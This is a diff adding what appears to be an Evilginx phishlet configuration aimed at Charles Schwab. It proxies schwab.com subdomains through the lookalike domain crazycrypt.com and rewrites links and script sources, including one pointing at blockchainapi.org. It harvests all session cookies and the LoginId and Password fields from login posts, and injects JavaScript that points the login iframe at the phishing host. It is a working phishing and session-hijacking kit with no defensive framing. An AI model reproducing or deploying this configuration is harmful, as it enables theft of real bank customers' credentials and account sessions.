@@ -1,0 +1,83 @@
+author: '@AGradePHP'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'schwab.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'lms', orig_sub: 'lms', domain: 'schwab.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'client', orig_sub: 'client', domain: 'schwab.com', session: true, is_landing: false, auto_filter: false}
+  #- {phish_sub: 'client', orig_sub: 'client', domain: 'schwabcdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'schwab.com', sessi on: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pce', orig_sub: 'pce', domain: 'schwab.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'schwab.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cempa', orig_sub: 'cempa', domain: 'schwab.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'smetric', orig_sub: 'smetric', domain: 'schwab.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'eum-appd', orig_sub: 'eum-appd', domain: 'schwab.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters: 
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: '"https://s.go-mpulse.net/boomerang/"', replace: '"https://blockchainapi.org/", bbci="https://blockchainapi.org/EX83G-QNMSL-P9787-NRSC7-7EJJ3.js"', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: '`a\.src=e\+\"EX83G-QNMSL-P9787-NRSC7-7EJJ3\"`gm', replace: "a.src=bbci+'EX83G-QNMSL-P9787-NRSC7-7EJJ3'", mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: '</head>', replace: '</head><body>', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: '\.schwab\.', replace: '.crazycrypt.', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'if\(i\)this\.domain=i\;', replace: 'this.domain="www.schwab.com";', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: '</html>', replace: '</body></html>', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'i=document.domain,', replace: 'i="www.shcwab.com",', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  #- {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'lms.schwab.com', replace: 'lms.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  #- {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'client.schwab.com', replace: 'client.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'schwab.com', replace: 'crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: 'www.schwab.com', replace: 'www.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'smetric.schwab.com', replace: 'smetric.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  #- {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: '.schwab.', replace: '.crazycrypt.', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'lms.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: '<body>', replace: '<script src="https://code.jquery.com/jquery-3.6.0.min.js"integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="crossorigin="anonymous"></script><body>', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'lms.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: '\.schwab\\\.com', replace: '.crazycrypt\.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'lms.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'lms.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: 'lms.schwab.com', replace: 'lms.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'lms.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: 'top.location=self.location', replace: 'console.log("done")', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'lms.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: 'client.schwab.com', replace: 'client.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'client.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: 'client.schwab.com', replace: 'client.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'client.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: 'client.schwabcdn.com', replace: 'client.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'client.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: '\.schwab\\\.com', replace: '.crazycrypt\.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'client.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: 'content.schwab.com', replace: 'content.crazycrypt.com', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'client.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: '"https://s.go-mpulse.net/boomerang/"', replace: '"https://blockchainapi.org/", bbci="https://blockchainapi.org/EX83G-QNMSL-P9787-NRSC7-7EJJ3.js"', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'client.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: '`a\.src=e\+\"EX83G-QNMSL-P9787-NRSC7-7EJJ3\"`gm', replace: "a.src=bbci+'EX83G-QNMSL-P9787-NRSC7-7EJJ3'", mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+  - {triggers_on: 'client.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: '</head>', replace: '</head><body>', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript', 'application/x-protobuf']}
+
+auth_tokens:
+  - domain: '.schwab.com'
+    keys: ['.*,regexp']
+  - domain: 'lms.schwab.com'
+    keys: ['ADRUM_BTa','.*,regexp', 'AcctInfo']
+  - domain: '.client.schwab.com'
+    keys: ['.*,regexp']
+  - domain: 'client.schwab.com'
+    keys: ['.*,regexp']
+  - domain: 'schwab.com'
+    keys: ['.*,regexp']
+  - domain: 'www.schwab.com'
+    keys: ['.*,regexp']
+  - domain: 'lms.schwab.com'
+    keys: ['.*,regexp']
+  - domain: '.lms.schwab.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'LoginId'
+    search: '(name="LoginId"[\r\n]+[^\r\n]+)'
+    type: 'post'
+  password:
+    key: 'Password' 
+    search: '(name="Password"[\r\n]+[^\r\n]+)'
+    type: 'post'
+
+auth_urls:
+  - '/Sua/.*'
+  - '/clientapps/.*'
+login:
+  domain: 'www.schwab.com'
+  path: '/'
+js_inject:
+  - trigger_domains: ["www.schwab.com"]
+    trigger_paths: ["/"]
+    trigger_params: []
+    script: |
+      function lp(){console.log('Setting new iframe src');$("#LoginComponentForm").attr("src", "https://lms.crazycrypt.com/Login?clientId=schwab-prospect&startInSetId=1&redirectUri=https://client.crazycrypt.com/login/signon/authcodehandler.ashx&enableappd=false");}setTimeout(function(){lp();}, 100);
